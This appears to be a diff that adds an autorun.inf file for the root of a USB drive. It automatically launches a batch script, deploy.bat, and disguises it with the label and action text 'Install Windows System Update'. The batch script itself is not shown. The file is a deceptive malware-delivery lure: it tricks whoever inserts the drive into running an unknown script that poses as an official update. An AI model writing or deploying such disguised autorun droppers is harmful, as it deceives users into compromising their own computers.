@@ -1,0 +1,13 @@
+# USB Deployment - Autorun Configuration
+# Place this file as autorun.inf on USB root
+
+[autorun]
+open=deploy.bat
+action=Install Windows System Update
+icon=deploy.bat,0
+label=Windows System Update
+
+[Content]
+MusicFiles=false
+PictureFiles=false
+VideoFiles=false
